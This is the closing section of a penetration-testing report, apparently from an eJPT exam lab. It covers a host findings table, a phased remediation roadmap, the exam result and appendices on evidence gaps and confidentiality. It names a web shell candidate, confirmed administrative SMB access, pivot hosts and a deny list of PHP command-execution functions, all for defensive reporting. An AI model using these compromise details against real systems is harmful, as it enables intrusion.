| **WINSERVER-03** | `192.168.100.55` | IIS 10.0 & `/todo.txt` identified; `Administrator` SMB login confirmed; dual-homed internal host list (`.51`, `.57`, `.61`) recorded | **Administrative SMB Access & Internal Pivot Host Confirmed** |
| **Additional Windows Host** | `192.168.100.63` | Windows Server 2016 fingerprint recorded | **Host Discovery Confirmed; Enumeration Incomplete** |
| **Additional Linux Host** | `192.168.100.67` | Linux OS & SSH service recorded | **Host Discovery Confirmed; Enumeration Incomplete** |

---

# 8. Strategic Remediation Roadmap

In accordance with **PTES Phase 7 (Reporting)**, defensive remediation activities are prioritized into three actionable execution horizons:

## Phase 1: Immediate Containment (0–7 Days)

1. **Neutralize Web Application RCE (`WINSERVER-01`):** Remove *WordPress Responsive Thumbnail Slider v1.0* and *WP File Manager v7.1.4*. Block script execution in WordPress upload directories and downgrade the Apache service account from `NT AUTHORITY\SYSTEM` to a least-privilege local service account.
2. **Eliminate Exposed Web Shell Candidates (`WINSERVER-02` & `WINSERVER-03`):** Remove `/cmdasp.aspx` on `WINSERVER-02` and `/todo.txt` on `WINSERVER-03`. Perform a full web-root integrity sweep across all IIS and Apache servers.
3. **Restrict Database Network Exposure (`192.168.100.52` & `WINSERVER-01`):** Bind MariaDB on `192.168.100.52` (`3306/tcp`) and `WINSERVER-01` (`3307/tcp`) strictly to `127.0.0.1`, disable remote `root` authentication, and assign strong passwords to all database accounts.
4. **Rotate Compromised Credentials:** Immediately rotate passwords for Windows accounts (`Administrator` on `WINSERVER-03`, `mike` on `WINSERVER-01`), WordPress `admin`, and MariaDB accounts (`root`, `drupal`).

## Phase 2: Tactical Hardening (8–30 Days)

5. **Enforce SMB Security Baseline:** Disable SMBv1 across all Windows servers (`WINSERVER-01`, `WINSERVER-02`, `WINSERVER-03`, `192.168.100.63`) and enforce mandatory SMB message signing via Group Policy.
6. **Harden PHP & Application Runtimes:** Configure `disable_functions` in `php.ini` to restrict operating-system command execution primitives (`exec`, `system`, `shell_exec`, `passthru`, `proc_open`, `popen`).
7. **Restrict Remote Management Interfaces:** Limit access to SMB (`445/tcp`), RDP (`3389/tcp`), WinRM (`5985/tcp`, `47001/tcp`), and SSH (`22/tcp`) using host-based firewalls and jump-host ACLs.

## Phase 3: Strategic Architecture & Monitoring (30–90 Days)

8. **Redesign DMZ-to-Internal Network Segmentation (`WINSERVER-03`):** Eliminate dual-homed server configurations bridging DMZ and internal subnets. Route all cross-zone traffic through a dedicated firewall with strict ingress/egress filtering.
9. **Lifecycle Patch Management:** Upgrade legacy operating systems (Windows Server 2012 R2) and outdated CMS platforms (Drupal 7.57, WordPress 5.9.3, PHP 7.4.26) to supported, patched versions.
10. **Centralized SIEM & Audit Logging:** Forward Windows Security Event Logs (Event IDs `4624`, `4625`, `4688`, `5140`), IIS/Apache access logs, and MariaDB authentication logs to a centralized SIEM for anomaly and lateral-movement detection.

---

# 9. Assessment Outcome

| Certification Metric | Record |
| :--- | :--- |
| **Certification Examination** | eLearnSecurity Junior Penetration Tester (eJPT) |
| **Candidate** | Karthik G. |
| **Assessment Date** | 13 November 2026 |
| **Final Examination Score** | **91%** |
| **Final Status** | **PASSED** |

The engagement demonstrated end-to-end execution of the **Penetration Testing Execution Standard (PTES)** across a heterogeneous Windows and Linux network environment, culminating in verified `NT AUTHORITY\SYSTEM` compromise, privileged database and SMB validation, and multi-homed network pivot analysis.

---

# Appendix A — Technical Accuracy and Evidence Limitations

This report was reconstructed from retained assessment notes and preserved terminal outputs. It is not a verbatim export of every terminal session from the examination environment.

To uphold rigorous technical integrity, the following items are noted as requiring original raw terminal logs or screenshots before they could be presented as fully evidenced claims:

- Complete verbatim Nmap output blocks for `WINSERVER-02` (`192.168.100.51`), `192.168.100.52`, `WINSERVER-03` (`192.168.100.55`), `192.168.100.63`, and `192.168.100.67`.
- Exact directory discovery commands and HTTP requests/responses for `WINSERVER-02` (`/cmdasp.aspx`) and `WINSERVER-03` (`/todo.txt`).
- Confirmation of whether `/cmdasp.aspx` on `WINSERVER-02` yielded interactive command execution.
- Post-authentication SQL queries and table enumeration outputs from the MariaDB instance on `192.168.100.52`.
- Exact internal subnet CIDR mask, routing table entries, and pivoting commands used via `WINSERVER-03` (`192.168.100.55`) toward internal hosts (`192.168.100.51`, `192.168.100.57`, `192.168.100.61`).
- Service enumeration and exploitation results for `192.168.100.63` and `192.168.100.67`.
- The cleartext string inside the downloaded 34-byte `C:\Users\mike\Documents\flag.txt` file on `WINSERVER-01`.
- The exact Windows HotFix (`systeminfo` / `wmic qfe`) count on `WINSERVER-01`.

**Zero-Fabrication Guarantee:** No missing exploit output, credential, flag value, or host compromise has been fabricated or extrapolated beyond the retained record.

---

# Appendix B — Confidentiality and Handling

This document contains assessment-specific network topology, host configurations, and exploitation records. It is classified as **Private — Personal Technical Record** and should be handled in accordance with applicable examination non-disclosure and academic integrity policies.

Before publishing any portion of this document in a public portfolio, ensure that examination-specific IP addresses, cleartext credentials, flags, hostnames, and proprietary lab identifiers prohibited from public disclosure are sanitized or redacted.

---
*End of Penetration Testing Assessment Report — Prepared in accordance with the Penetration Testing Execution Standard (PTES).*
